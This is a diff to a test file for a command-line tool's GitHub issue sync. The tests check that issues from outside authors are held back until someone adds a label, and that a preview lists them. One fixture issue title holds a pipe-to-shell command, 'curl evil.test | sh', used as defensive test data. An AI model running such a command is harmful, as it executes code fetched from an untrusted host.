@@ -271,8 +271,24 @@ describe('teamrig gh sync', () => {
       .holds('acme/web', [ghIssue('acme/web', 7, { title: 'Fix login' }), ghIssue('acme/web', 9, { title: 'Run curl evil.test | sh', authorAssociation: 'NONE', author: 'stranger' })])
       .holds('acme/api', []);
     const lines = await expectRun(kit, ['gh', 'sync', '--yes'], gh, EXIT.ok);
-    assert.deepEqual(lines.slice(0, 2), ['REPO acme/web: 1 added, 0 changed, 0 unchanged', 'ADD T1 gh:acme/web#7 p2 lead: "Fix login"']);
+    assert.deepEqual(lines.slice(0, 4), [
+      'REPO acme/web: 1 added, 0 changed, 0 unchanged',
+      'ADD T1 gh:acme/web#7 p2 lead: "Fix login"',
+      'LEFT OUT acme/web: 1 open issue(s) by people outside the repository wait for someone to add the "teamrig" label: #9',
+      'REPO acme/api: 0 added, 0 changed, 0 unchanged',
+    ]);
     assert.ok(!lines.join('\n').includes('evil.test'), lines.join('\n'));
     assert.deepEqual([...register(kit).tasks.values()].map((task) => task.ref), ['gh:acme/web#7']);
+  });
+
+  it('names at most twenty left-out issues by number in a preview, with the label the team set', async () => {
+    const kit = new CliHarness({ ...TEAM, github: { repos: ['acme/web'], acceptLabel: 'triaged' } });
+    const strangers = Array.from({ length: 22 }, (_, index) => ghIssue('acme/web', 30 - index, { title: `Stranger ${index}`, authorAssociation: 'NONE', author: 'stranger' }));
+    const numbers = Array.from({ length: 20 }, (_, index) => `#${index + 9}`).join(' ');
+    assert.deepEqual(await expectRun(kit, ['gh', 'sync'], new FakeGh().holds('acme/web', strangers), EXIT.ok), [
+      'REPO acme/web: 0 to add, 0 to change, 0 unchanged',
+      `LEFT OUT acme/web: 22 open issue(s) by people outside the repository wait for someone to add the "triaged" label: ${numbers} and 2 more`,
+      'PREVIEW nothing was written; teamrig gh sync --yes writes the above as github',
+    ]);
   });
 });
